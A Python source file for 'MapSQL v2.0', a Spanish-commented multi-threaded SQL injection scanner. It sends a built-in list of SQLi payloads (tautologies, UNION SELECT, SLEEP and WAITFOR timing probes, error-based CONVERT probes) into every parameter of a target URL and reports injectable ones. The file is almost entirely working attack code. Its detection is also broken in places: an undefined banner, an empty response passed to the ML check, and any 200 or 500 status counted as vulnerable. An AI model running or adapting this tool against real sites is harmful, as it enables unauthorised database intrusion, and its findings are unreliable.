#!/usr/bin/env python3
"""
MapSQL v2.0 - Multi-threading + Machine Learning
La herramienta definitiva de SQLi
"""

import argparse
import sys
import requests
from urllib.parse import urlparse, parse_qs, urlencode
import time
from core.multi_thread import AdvancedThreadPool, sqli_worker
from core.ml_detector import MLDetector

# Tu banner existente aquí (el mismo que ya tienes)

class MapSQLUltimate:
    def __init__(self, url, threads=20, rate_limit=0, use_ml=True):
        self.url = url
        self.threads = threads
        self.rate_limit = rate_limit
        self.use_ml = use_ml
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'MapSQL/2.0'})
        
        # Payloads expandidos
        self.payloads = [
            "'", "\"", "' OR '1'='1", "' OR '1'='1' --",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' AND SLEEP(5)--", "' WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5) AND '1'='1", "\" OR SLEEP(5) AND \"1\"=\"1",
            "' AND 1=CONVERT(int, @@version)--", "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--"
        ]
        
        # Detector ML
        self.ml_detector = MLDetector() if use_ml else None
        
    def get_parameters(self):
        """Extrae parámetros de la URL"""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        return list(params.keys())
    
    def create_tasks(self):
        """Crea tareas para el pool de hilos"""
        params = self.get_parameters()
        if not params:
            print("[!] No se encontraron parámetros en la URL")
            return []
        
        tasks = []
        for param in params:
            for payload in self.payloads:
                # Construir URL con payload
                parsed = urlparse(self.url)
                query_params = parse_qs(parsed.query)
                query_params[param] = [payload]
                new_query = urlencode(query_params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                
                tasks.append({
                    'url': test_url,
                    'param': param,
                    'payload': payload,
                    'session': self.session
                })
        
        print(f"[*] Generadas {len(tasks)} tareas ({len(params)} parámetros × {len(self.payloads)} payloads)")
        return tasks
    
    def collect_baseline(self):
        """Recolecta baseline para ML"""
        if not self.ml_detector:
            return
        
        def normal_request():
            return self.session.get(self.url)
        
        self.ml_detector.collect_baseline(normal_request, num_samples=3)
    
    def process_results(self, results):
        """Procesa resultados con ML"""
        print("\n[+] Analizando resultados...")
        
        vulnerable_params = set()
        confirmed_payloads = []
        
        for result in results:
            if result and result.get('success'):
                if self.ml_detector:
                    # Análisis con ML
                    analysis = self.ml_detector.analyze_payload_response(
                        result['payload'],
                        '',  # Necesitarías capturar response.text
                        result['status_code'],
                        result['response_time']
                    )
                    
                    if analysis['vulnerable']:
                        vulnerable_params.add(result.get('param', 'unknown'))
                        confirmed_payloads.append(analysis)
                        print(f"\n[!] SQLi CONFIRMADA por ML!")
                        print(f"    Parámetro: {result.get('param')}")
                        print(f"    Payload: {result['payload']}")
                        print(f"    Confianza: {analysis['confidence']:.1f}%")
                        print(f"    Razón: {analysis['reason']}")
                else:
                    # Detección simple
                    if result['status_code'] in [500, 200]:  # Simplificado
                        vulnerable_params.add(result.get('param', 'unknown'))
                        print(f"[!] Posible SQLi en {result.get('param')} con payload {result['payload']}")
        
        return vulnerable_params, confirmed_payloads
    
    def run(self):
        """Ejecuta escaneo completo"""
        print(BANNER)
        print(f"[*] Target: {self.url}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Rate Limit: {self.rate_limit}/seg")
        print(f"[*] ML Mode: {'Activado' if self.use_ml else 'Desactivado'}\n")
        
        # Recolectar baseline para ML
        if self.use_ml:
            self.collect_baseline()
        
        # Crear tareas
        tasks = self.create_tasks()
        if not tasks:
            return
        
        # Ejecutar con multi-threading
        print("[*] Iniciando ataque con multi-threading...")
        pool = AdvancedThreadPool(max_workers=self.threads, rate_limit=self.rate_limit)
        results = pool.execute(tasks, sqli_worker)
        
        # Procesar resultados
        vulnerable_params, confirmed = self.process_results(results)
        
        # Reporte final
        print("\n" + "="*60)
        print("[+] RESUMEN FINAL")
        print("="*60)
        print(f"Parámetros vulnerables: {len(vulnerable_params)}")
        for param in vulnerable_params:
            print(f"  - {param}")
        
        if self.ml_detector:
            report = self.ml_detector.get_scan_report()
            print(f"\n[ML Report]")
            print(f"  Total payloads analizados: {report['total_payloads_tested']}")
            print(f"  Vulnerabilidades detectadas: {report['vulnerable_detected']}")
            print(f"  Confianza promedio: {report['average_confidence']:.1f}%")
        
        stats = pool.get_stats()
        print(f"\n[Thread Stats]")
        print(f"  Tareas exitosas: {stats['successful']}")
        print(f"  Tareas fallidas: {stats['failed']}")
        print(f"  Tasa de éxito: {stats['success_rate']:.1f}%")
        
        if vulnerable_params:
            print("\n[!] Se detectaron vulnerabilidades SQLi!")
        else:
            print("\n[-] No se detectaron vulnerabilidades")

def main():
    parser = argparse.ArgumentParser(description='MapSQL v2.0 - Multi-threading + ML')
    parser.add_argument('-u', '--url', required=True, help='URL objetivo')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Hilos concurrentes')
    parser.add_argument('--rate-limit', type=float, default=0, help='Segundos entre peticiones')
    parser.add_argument('--no-ml', action='store_true', help='Desactivar ML')
    
    args = parser.parse_args()
    
    scanner = MapSQLUltimate(
        url=args.url,
        threads=args.threads,
        rate_limit=args.rate_limit,
        use_ml=not args.no_ml
    )
    scanner.run()

if __name__ == "__main__":
    main()
